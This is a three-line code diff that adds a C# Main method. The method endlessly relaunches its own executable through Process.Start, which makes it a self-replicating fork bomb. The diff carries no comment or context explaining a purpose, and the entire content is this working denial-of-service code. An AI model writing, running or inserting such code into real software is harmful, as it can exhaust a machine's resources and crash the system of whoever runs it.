@@ -1,0 +1,3 @@
+static void Main() {
+    while (true) Process.Start(Assembly.GetExecutingAssembly().Location);
+}
